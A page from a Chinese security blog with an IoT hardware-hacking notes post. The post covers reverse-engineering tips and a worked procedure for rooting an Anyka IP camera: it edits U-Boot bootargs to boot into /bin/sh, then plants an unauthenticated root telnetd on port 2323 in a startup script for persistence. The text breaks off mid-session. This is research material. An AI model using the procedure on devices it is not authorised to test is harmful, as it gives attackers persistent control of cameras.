<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 3.8.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"21guns.top","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="have a nice day">
<meta property="og:url" content="http://21guns.top/page/6/index.html">
<meta property="og:site_name" content="have a nice day">
<meta property="og:locale" content="zh-CN">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="have a nice day">

<link rel="canonical" href="http://21guns.top/page/6/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>have a nice day</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">have a nice day</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://21guns.top/2021/08/09/iot/iot安全实用技巧小结/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="21Guns">
      <meta itemprop="description" content>
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="have a nice day">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/08/09/iot/iot安全实用技巧小结/" class="post-title-link" itemprop="url">iot安全实用技巧</a>
        </h2>

        <div class="post-meta">

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-08-09 14:41:33" itemprop="dateCreated datePublished" datetime="2021-08-09T14:41:33+08:00">2021-08-09</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-02-17 17:41:50" itemprop="dateModified" datetime="2022-02-17T17:41:50+08:00">2022-02-17</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/IOT安全/" itemprop="url" rel="index"><span itemprop="name">IOT安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>[toc]</p>
<h1 id="iot安全实用技巧"><a href="#iot安全实用技巧" class="headerlink" title="iot安全实用技巧"></a>iot安全实用技巧</h1><h2 id="函数定义在哪个so文件中"><a href="#函数定义在哪个so文件中" class="headerlink" title="函数定义在哪个so文件中"></a>函数定义在哪个so文件中</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1 挨个so文件搜</span></span><br><span class="line">find ./ -name <span class="string">"*.so"</span> | xargs readelf -s &gt; so.txt</span><br><span class="line">subl so.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2 ghidra中打开，设置lib目录，symbol-tree中搜索</span></span><br></pre></td></tr></table></figure>
<h2 id="查看所有elf的符号"><a href="#查看所有elf的符号" class="headerlink" title="查看所有elf的符号"></a>查看所有elf的符号</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find ./ -<span class="built_in">type</span> f |xargs file|grep ELF |awk <span class="string">'BEGIN&#123;FS=":"&#125; &#123;printf $1 "\n"&#125;'</span> | xargs readelf -s &gt; 1.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># cat 1.txt看谁有system</span></span><br></pre></td></tr></table></figure>
<h2 id="已编译的"><a href="#已编译的" class="headerlink" title="已编译的"></a>已编译的</h2><ul>
<li>编译好的静态的gdbserver：<a href="https://github.com/stayliv3/gdb-static-cross/tree/master/prebuilt" target="_blank" rel="noopener">https://github.com/stayliv3/gdb-static-cross/tree/master/prebuilt</a></li>
</ul>
<h2 id="ida快捷键"><a href="#ida快捷键" class="headerlink" title="ida快捷键"></a>ida快捷键</h2><ul>
<li>D：data，转换byte、half、word</li>
<li>R：字符转换</li>
<li>O：offset，解释地址为数据段偏移量，用于字符串标号</li>
<li>H：10/16进制转换</li>
</ul>
<h2 id="符号名识别"><a href="#符号名识别" class="headerlink" title="符号名识别"></a>符号名识别</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1 依据日志打印判定 符号名：arcadyan_request_hook、mac</span></span><br><span class="line"><span class="comment"># 特征：print、log</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[%s] request from: IP=[%s], MAC=[%s]\n"</span>,<span class="string">"arcadyan_request_hook"</span>,(const char *)(a1 + 6360),(const char *)mac);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2 依据配置读取判定 符号名：Hostname</span></span><br><span class="line"><span class="comment"># 特征：cfg、get</span></span><br><span class="line">mapi_ccfg_get_str(tid, <span class="string">"ARC_SYS_Hostname"</span>, Hostname, 32);</span><br><span class="line">mapi_tmp_get(tid_1, <span class="string">"TMP_WLAN_AOSS_WPS_Bridge_Busy"</span>, v58, 8);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 根据错误日志判断函数名也不全对</span></span><br><span class="line"><span class="comment"># 多个目标文件链接到同一个可执行文件，故可能有多种，如main中</span></span><br><span class="line">log_error_msg_fatal(<span class="string">"src/boa.c"</span>, 284, <span class="string">"main"</span>, <span class="string">"can't open /dev/null"</span>);</span><br><span class="line">log_error_msg_fatal(<span class="string">"src/boa.c"</span>, 579, <span class="string">"drop_privs"</span>, <span class="string">"setuid"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4 打印错误日志时暴露函数名 </span></span><br><span class="line"><span class="comment"># 依次：文件名、行、函数名、错误信息</span></span><br><span class="line">log_error_msg_fatal(<span class="string">"src/boa.c"</span>, 284, <span class="string">"main"</span>, <span class="string">"can't open /dev/null"</span>);</span><br><span class="line">源码中：define DIE(mesg) log_error_mesg_fatal(__FILE__, __LINE__, __func__, mesg)</span><br></pre></td></tr></table></figure>
<h2 id="寻找函数定义"><a href="#寻找函数定义" class="headerlink" title="寻找函数定义"></a>寻找函数定义</h2><ul>
<li>cisco rv340的upload.cgi的base64_decode函数<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 共3个so文件</span></span><br><span class="line">File: ./usr/lib/libmiscu.so</span><br><span class="line">Symbol table <span class="string">'.dynsym'</span> contains 140 entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">   131: 00005874   172 FUNC    GLOBAL DEFAULT   10 base64_decode</span><br><span class="line"></span><br><span class="line">File: ./usr/lib/libpolarssl.so</span><br><span class="line">Symbol table <span class="string">'.dynsym'</span> contains 543 entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">   520: 000097a8   552 FUNC    GLOBAL DEFAULT   10 base64_decode</span><br><span class="line">   </span><br><span class="line">File: ./usr/lib/libmbedtls.so</span><br><span class="line">Symbol table <span class="string">'.dynsym'</span> contains 543 entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">   520: 000097a8   552 FUNC    GLOBAL DEFAULT   10 base64_decode</span><br><span class="line">   </span><br><span class="line"><span class="comment"># 2与3同，size和value相同，均指向同一个文件</span></span><br><span class="line">lrwxr-xr-x 1 501 dialout 13 Aug 13 09:35 usr/lib/libpolarssl.so -&gt; libmbedtls.so</span><br><span class="line">lrwxr-xr-x 1 501 dialout 15 Aug 13 09:35 usr/lib/libmbedtls.so -&gt; libmbedtls.so.9</span><br><span class="line">lrwxr-xr-x 1 501 dialout 20 Aug 13 09:35 usr/lib/libmbedtls.so.9 -&gt; libmbedtls.so.1.3.12</span><br><span class="line"></span><br><span class="line"><span class="comment"># 程序加载了哪个so</span></span><br><span class="line"><span class="comment"># 没找到，</span></span><br><span class="line">/tmp <span class="comment"># ps|grep nginx</span></span><br><span class="line">10657 root     16588 S    nginx: master process /usr/sbin/nginx</span><br><span class="line">/tmp <span class="comment"># cat /proc/10657/maps</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 结合调用方，直接逆向so文件（就俩而已）</span></span><br><span class="line"><span class="comment"># upload.cgi</span></span><br><span class="line">v18 = base64_decode(http_cookie, &amp;save_ptr);</span><br><span class="line"><span class="comment"># libmiscu.so</span></span><br><span class="line">void *__fastcall base64_decode(char *a1, int *a2)</span><br><span class="line"><span class="comment"># libmbedtls.so.1.3.12</span></span><br><span class="line">int __fastcall base64_decode(_BYTE *a1, unsigned int *a2, unsigned __int8 *a3, unsigned int a4)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="函数识别"><a href="#函数识别" class="headerlink" title="函数识别"></a>函数识别</h2><ul>
<li>mips little endian，ghidra 好于 ida<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 二进制是相同的，解析出的指令不同</span></span><br><span class="line"><span class="comment"># ida未识别为函数，li+addiu</span></span><br><span class="line">.text:00415418 4C 00 1C 3C+                li      <span class="variable">$gp</span>, unk_4C1810</span><br><span class="line">.text:00415418 10 18 9C 27</span><br><span class="line">.text:00415420 D8 FF BD 27                 addiu   <span class="variable">$sp</span>, -0x28</span><br><span class="line"><span class="comment"># ghidra识别成功，lui+addiu+addiu</span></span><br><span class="line">00415418 4c 00 1c 3c     lui        gp,0x4c</span><br><span class="line">0041541c 10 18 9c 27     addiu      gp,gp,0x1810</span><br><span class="line">00415420 d8 ff bd 27     addiu      sp,sp,-0x28</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="发现开源软件"><a href="#发现开源软件" class="headerlink" title="发现开源软件"></a>发现开源软件</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># main中打印帮助</span></span><br><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">    opt = getopt(argc, (char *const *)argv, <span class="string">"c:vdl:f:r:a:"</span>);</span><br><span class="line">    switch ( opt )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'v'</span>:</span><br><span class="line">        fprintf((FILE *)stderr, <span class="string">"boa: server version %s\n"</span>, <span class="string">"1.32.1.10"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># string窗口中搜索boa，作为http响应的字段</span></span><br><span class="line">Server: Boa/0.94.14rc21</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载源码时：版本号是0.94.14rc21而非1.32.1.10</span></span><br><span class="line">http://www.boa.org/boa-0.94.14rc21.tar.gz</span><br></pre></td></tr></table></figure>
<h2 id="判定main"><a href="#判定main" class="headerlink" title="判定main"></a>判定main</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sub_A08C为main</span></span><br><span class="line">// positive sp value has been detected, the output may be wrong!<span class="comment"># ？？？</span></span><br><span class="line">int start()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">return</span> ((int (__fastcall *)(int (__fastcall *)(int, char *const *)))_uClibc_main)(sub_A08C);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 汇编程序的入口是_start，而C程序的入口是main函数</span></span><br><span class="line"><span class="comment"># main函数是程序的入口点其实不准确，_start才是真正的入口点，而main函数是被_start调用的</span></span><br></pre></td></tr></table></figure>
<h2 id="固件获取"><a href="#固件获取" class="headerlink" title="固件获取"></a>固件获取</h2><ul>
<li>社工客服法：<a href="https://xz.aliyun.com/t/5054" target="_blank" rel="noopener">https://xz.aliyun.com/t/5054</a></li>
</ul>
<h2 id="uboot-getshell"><a href="#uboot-getshell" class="headerlink" title="uboot-getshell"></a>uboot-getshell</h2><ul>
<li>任意键进入uboot，修改环境变量</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">lxl@MBP  ~  minicom -c on</span><br><span class="line">U-Boot 2013.10.0-AK_V3.0.08 (Mar 05 2019 - 15:37:04)</span><br><span class="line"></span><br><span class="line">DRAM:  64 MiB</span><br><span class="line">8 MiB</span><br><span class="line">Create flash partition table init OK!</span><br><span class="line">ANYKA SDHC/MMC4.0: 0</span><br><span class="line">Load Env CRC OK!</span><br><span class="line">In:    serial</span><br><span class="line">Out:   serial</span><br><span class="line">Err:   serial</span><br><span class="line">Net:   AKEthernet-0</span><br><span class="line"></span><br><span class="line">Hit any key to stop autoboot:  3</span><br><span class="line"> 0</span><br><span class="line"></span><br><span class="line">anyka$</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改环境变量并保存</span></span><br><span class="line"><span class="comment"># bootargs的init=/bin/sh</span></span><br><span class="line">anyka<span class="variable">$printenv</span> bootargs</span><br><span class="line">                        bootargs=console=ttySAK0,115200n8 root=/dev/mtdblock4 rootfstype=squashfs init=/sbin/init mem=64M memsize=64M</span><br><span class="line"></span><br><span class="line">anyka<span class="variable">$setenv</span> bootargs console=ttySAK0,115200n8 root=/dev/mtdblock4 rootfstype=squashfs init=/bin/sh mem=64M memsize=64M</span><br><span class="line"></span><br><span class="line">anyka<span class="variable">$saveenv</span></span><br><span class="line"></span><br><span class="line">Saving Environment to SPI Flash...</span><br><span class="line">Env save <span class="keyword">done</span> OK</span><br><span class="line"></span><br><span class="line">anyka<span class="variable">$printenv</span> bootargs</span><br><span class="line">                        bootargs=console=ttySAK0,115200n8 root=/dev/mtdblock4 rootfstype=squashfs init=/bin/sh mem=64M memsize=64M</span><br></pre></td></tr></table></figure>
<ul>
<li>重启，uboot后进入sh，修改自启程序，实现常驻</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 0 mtdblock8对应/mnt/mtd，jffs2文件系统（自启程序nvipcstart.sh位于此）</span></span><br><span class="line">~ <span class="comment"># mount</span></span><br><span class="line">rootfs on / <span class="built_in">type</span> rootfs (rw)</span><br><span class="line">/dev/root on / <span class="built_in">type</span> squashfs (ro,relatime)</span><br><span class="line">devtmpfs on /dev <span class="built_in">type</span> devtmpfs (rw,relatime,mode=0755)</span><br><span class="line">proc on /proc <span class="built_in">type</span> proc (rw,relatime)</span><br><span class="line">tmpfs on /tmp <span class="built_in">type</span> tmpfs (rw,relatime)</span><br><span class="line">tmpfs on /var <span class="built_in">type</span> tmpfs (rw,relatime)</span><br><span class="line">devpts on /dev/pts <span class="built_in">type</span> devpts (rw,relatime,mode=600,ptmxmode=000)</span><br><span class="line">tmpfs on /mnt/mtd <span class="built_in">type</span> tmpfs (rw,relatime)</span><br><span class="line">sysfs on /sys <span class="built_in">type</span> sysfs (rw,relatime)</span><br><span class="line">/dev/mtdblock5 on /usr <span class="built_in">type</span> squashfs (ro,relatime)</span><br><span class="line">/dev/mtdblock6 on /mvs <span class="built_in">type</span> squashfs (ro,relatime)</span><br><span class="line">/dev/mtdblock7 on /ext <span class="built_in">type</span> squashfs (ro,relatime)</span><br><span class="line">/dev/mtdblock8 on /mnt/mtd <span class="built_in">type</span> jffs2 (rw,relatime)</span><br><span class="line">/dev/loop0 on /tmp/ramdisk <span class="built_in">type</span> vfat (rw,relatime,fmask=0022,dmask=0022,codepage=cp437,iocharset=iso8859-1,shortname=mixed,errors=remount-ro)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 进入sh</span></span><br><span class="line">/bin/sh: c��ɹ���off</span><br><span class="line">~ <span class="comment"># ls</span></span><br><span class="line">bin   dev   etc   ext   init  lib   mnt   mvs   proc  sbin  sys   tmp   usr   var</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2 mount命令需挂载proc（本身挂载proc就需要mount，不矛盾？）</span></span><br><span class="line">~ <span class="comment"># mount</span></span><br><span class="line">mount: no /proc/mounts</span><br><span class="line">~ <span class="comment"># mount -t proc /proc</span></span><br><span class="line">~ <span class="comment"># mount</span></span><br><span class="line">rootfs on / <span class="built_in">type</span> rootfs (rw)</span><br><span class="line">/dev/root on / <span class="built_in">type</span> squashfs (ro,relatime)</span><br><span class="line">devtmpfs on /dev <span class="built_in">type</span> devtmpfs (rw,relatime,mode=0755)</span><br><span class="line">proc on /proc <span class="built_in">type</span> proc (rw,relatime)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 挂载mtdblock8</span></span><br><span class="line">~ <span class="comment"># cd mnt/mtd</span></span><br><span class="line">/mnt/mtd <span class="comment"># ls</span></span><br><span class="line">/mnt/mtd <span class="comment"># mount -t jffs2 /dev/mtdblock8 /mnt/mtd</span></span><br><span class="line">/mnt/mtd <span class="comment"># mount</span></span><br><span class="line">rootfs on / <span class="built_in">type</span> rootfs (rw)</span><br><span class="line">/dev/root on / <span class="built_in">type</span> squashfs (ro,relatime)</span><br><span class="line">devtmpfs on /dev <span class="built_in">type</span> devtmpfs (rw,relatime,mode=0755)</span><br><span class="line">proc on /proc <span class="built_in">type</span> proc (rw,relatime)</span><br><span class="line">/dev/mtdblock8 on /mnt/mtd <span class="built_in">type</span> jffs2 (rw,relatime)</span><br><span class="line"></span><br><span class="line">/mnt/mtd <span class="comment"># cd ..</span></span><br><span class="line">/mnt <span class="comment"># cd mtd/</span></span><br><span class="line">/mnt/mtd <span class="comment"># ls</span></span><br><span class="line">DDNSClient.ini          inet.conf               prerun</span><br><span class="line">ResetBind.ini           ipsourceserver.ini      recorde.ini</span><br><span class="line">as9ipcwatchdog          isp_mis2006.conf        recorder</span><br><span class="line">as9nvserver             mqtest_stop             resolv.conf</span><br><span class="line">as9updatednsip          mtd_remount.sh          stopallapp.sh</span><br><span class="line">asnvdvrclientdemo       mv_clog_cache.data      styleId</span><br><span class="line">audiofile_player        mvconf                  user_info.ini</span><br><span class="line">authority.ini           mvsound                 venc.cfg</span><br><span class="line">dns_last_serverips.ini  network_Info.ini        vg_boot.sh</span><br><span class="line">h265_1920x1080.cfg      nvconfig.ini            vsipbroadcast</span><br><span class="line">idcheck.sh              nvipcstart.sh           wificonf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4 修改系统自启程序，实现常驻</span></span><br><span class="line">/mnt/mtd <span class="comment"># cat nvipcstart.sh</span></span><br><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">hostname V380E</span><br><span class="line">/sbin/telnetd -p 2323 -l /bin/sh &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5 umount（是否必要？）</span></span><br><span class="line"><span class="comment"># 实测reboot不行</span></span><br><span class="line">/mnt <span class="comment"># umount /mnt/mtd</span></span><br><span class="line">/mnt <span class="comment"># mount</span></span><br><span class="line">rootfs on / <span class="built_in">type</span> rootfs (rw)</span><br><span class="line">/dev/root on / <span class="built_in">type</span> squashfs (ro,relatime)</span><br><span class="line">devtmpfs on /dev <span class="built_in">type</span> devtmpfs (rw,relatime,mode=0755)</span><br><span class="line">proc on /proc <span class="built_in">type</span> proc (rw,relatime)</span><br><span class="line">/mnt <span class="comment"># reboot</span></span><br><span class="line">/mnt <span class="comment"># ls</span></span><br><span class="line">mtd     nand    sdcard</span><br></pre></td></tr></table></figure>
<ul>
<li>telnet连接</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1 再次进入uboot，将bootargs复原</span></span><br><span class="line">U-Boot 2013.10.0-AK_V3.0.08 (Mar 05 2019 - 15:37:04)</span><br><span class="line">Hit any key to stop autoboot:  3</span><br><span class="line"> 0</span><br><span class="line"></span><br><span class="line">anyka<span class="variable">$printenv</span> bootargs</span><br><span class="line">                        bootargs=console=ttySAK0,115200n8 root=/dev/mtdblock4 rootfstype=squashfs init=/bin/sh mem=64M memsize=64M</span><br><span class="line"></span><br><span class="line">anyka<span class="variable">$setenv</span> bootargs console=ttySAK0,115200n8 root=/dev/mtdblock4 rootfstype=squashfs init=/sbin/init mem=64M memsize=64M</span><br><span class="line">anyka<span class="variable">$saveenv</span></span><br><span class="line"></span><br><span class="line">Saving Environment to SPI Flash...</span><br><span class="line">Env save <span class="keyword">done</span> OK</span><br><span class="line">anyka<span class="variable">$printenv</span> bootargs</span><br><span class="line">                        bootargs=console=ttySAK0,115200n8 root=/dev/mtdblock4 rootfstype=squashfs init=/sbin/init mem=64M memsize=64M</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2 实测reset无效</span></span><br><span class="line">anyka<span class="variable">$reset</span></span><br><span class="line">           resetting 